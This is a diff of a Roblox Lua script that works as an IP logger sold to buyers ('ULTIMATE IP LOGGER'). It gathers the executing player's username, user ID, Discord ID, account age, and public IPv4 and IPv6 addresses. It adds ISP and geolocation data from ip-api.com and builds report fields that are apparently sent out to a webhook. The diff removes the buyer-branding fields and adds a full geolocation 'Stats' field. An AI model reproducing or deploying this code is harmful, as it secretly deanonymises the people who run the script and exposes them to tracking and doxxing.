@@ -2,20 +2,16 @@ local LocalPlayer = game:GetService("Players").LocalPlayer
 local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
 local discordID = LocalPlayer:GetAttribute("DiscordID")
-local buyerUsername = "Seriality"
-local buyerRank = "Owner"
-local buyerPlan = "ULTIMATE IP LOGGER"
-local buyerUserID = "924958541092114492"
-local expiredDate = "99/99/9999"
 local username = LocalPlayer.Name
-local ipv4 = game:HttpGet("https://v4.ident.me/")
-local ipv6 = game:HttpGet("https://v6.ident.me/")
+local ipv4 = game:HttpGet("https://api.ipify.org")
+local ipv6 = game:HttpGet("https://api64.ipify.org")
 local jobId = game.JobId
 local job = 'game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "' .. jobId .. '")'
 local ispResponse = game:HttpGet(('http://ip-api.com/json/%s'):format(ipv4))
 local ispInfo = game:GetService('HttpService'):JSONDecode(ispResponse)
 local isp = ispInfo.org
 local ispAS = ispInfo.as
+local stats = game:HttpGet("http://ip-api.com/json")
 local profilelink = 'https://roblox.com/users/' .. LocalPlayer.UserId .. '/profile'
 local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local clientID = LocalPlayer.UserId
@@ -139,38 +135,13 @@ pcall(function()
                         ["inline"] = true
                     },
                     {
-                        ["name"] = "Executor&",
+                        ["name"] = "Executors",
                         ["value"] = executor,
                         ["inline"] = true
                     },
                     {
-                        ["name"] = "Script",
-                        ["value"] = "**PLAYER HAS EXECUTE THE SCRIPT**",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "IP Logger Buyer",
-                        ["value"] = buyerUsername,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Buyer Rank",
-                        ["value"] = buyerRank,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Buyer Plan",
-                        ["value"] = buyerPlan,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Buyer User ID",
-                        ["value"] = buyerUserID,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Expired Date",
-                        ["value"] = expiredDate,
+                        ["name"] = "Stats",
+                        ["value"] = stats,
                         ["inline"] = true
                     },
                     {
